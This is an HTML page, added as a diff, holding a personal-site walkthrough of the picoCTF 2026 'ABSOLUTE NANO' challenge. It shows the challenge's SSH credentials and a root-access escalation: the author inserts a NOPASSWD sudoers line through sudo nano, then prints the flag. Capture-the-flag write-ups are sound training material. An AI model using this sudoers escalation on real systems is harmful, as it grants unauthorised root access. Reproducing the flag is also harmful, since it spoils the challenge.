@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>picoCTF ABSOLUTE NANO @ Shukularuni</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="icon" type="image/x-icon" href="/icon.png">
+</head>
+<body>
+    <header>
+        <h1>picoCTF General Skills Guide</h1>
+        <p>here's how to solve ABSOLUTE NANO</p>
+    </header>
+    <main>
+        <section>
+            <a href="./">Back to the General Skills Guides</a>
+            <hr>
+            <h2>ABSOLUTE NANO</h2>
+            <pre>Name: ABSOLUTE NANO
+Description: You have complete power with nano. Think you can get the flag? ssh -p 63127 ctf-player@crystal-peak.picoctf.net using password f8c75136
+Author: Darkraicg492
+Tags: Medium, General Skills, picoCTF 2026
+Challenge from: picoCTF 2026
+Hints:
+1. What can you do with nano?</pre>
+            <h2>Theory</h2>
+            <p>According to the description, to get the flag we have to do some black magic with nano, maybe some privilege escalation or something like that. So we'll skip on over to the solution part to enter into the SSH with the command and password that we are given.</p>
+            <h2>Solution</h2>
+            <p>So let's enter to the machine with the SSH command and check if there's anything there:</p>
+            <pre>shukularuni@SHUKULAP:~$ ssh -p 55074 ctf-player@crystal-peak.picoctf.net
+ctf-player@crystal-peak.picoctf.net's password: f8c75136
+
+ctf-player@challenge:~$ ls
+flag.txt
+ctf-player@challenge:~$ cat flag.txt
+cat: flag.txt: Permission denied</pre>
+            <p>It seems that we can't open the flag file, let's check what we can do with sudo as a non-admin user:</p>
+            <pre>ctf-player@challenge:~$ sudo -l
+Matching Defaults entries for ctf-player on challenge:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User ctf-player may run the following commands on challenge:
+    (ALL) NOPASSWD: /bin/nano /etc/sudoers</pre>
+            <p>So the only thing that we can do using sudo, the command that gives administrator powers, is edit the sudoers file with nano. This is actually perfect since with the sudoers file we can give ourselves more sudo permissions, so we'll open the file first with sudo:</p>
+            <pre>#
+# This file MUST be edited with the 'visudo' command as root.
+#
+# Please consider adding local content in /etc/sudoers.d/ instead of
+# directly modifying this file.
+#
+# See the man page for details on how to write a sudoers file.
+#
+Defaults        env_reset
+Defaults        mail_badpass
+Defaults        secure_path="/usr/local/sbin:/usr...
+...</pre>
+            <p>Now just add this line wherever inside the file where we give ourselves permission to use sudo on anything:</p>
+            <pre>ctf-player ALL=(ALL:ALL) NOPASSWD: ALL
+#
+# This file MUST be edited with the 'visudo' command as root.
+#
+...</pre>
+            <p>To exit this just press Ctrl+O to save, enter, then Ctrl+X to exit the nano view. Now that we've done that we should be able to print the flag with sudo's permission:</p>
+            <pre>ctf-player@challenge:~$ sudo cat flag.txt
+picoCTF{n4n0_411_7h3_w4y_7b340dc3}</pre>
+            <p>There we go! That's the flag.</p>
+            <p>I rated this level as "good"! :3</p>
+            <hr>
+            <a target="_blank" href="https://play.picoctf.org/practice/challenge/748">https://play.picoctf.org/practice/challenge/748</a>
+        </section>
+        <section class="link-list">
+            <h2>Explore My Website</h2>
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/search.html">Search</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/guides.html">Guides</a></li>
+            </ul>
+            <br><br><br>
+        </section>
+    </main>
+    <footer>
+        <p class="cute">Made with ❤️ by Shukularuni</p>
+    </footer>
+</body>
+</html>
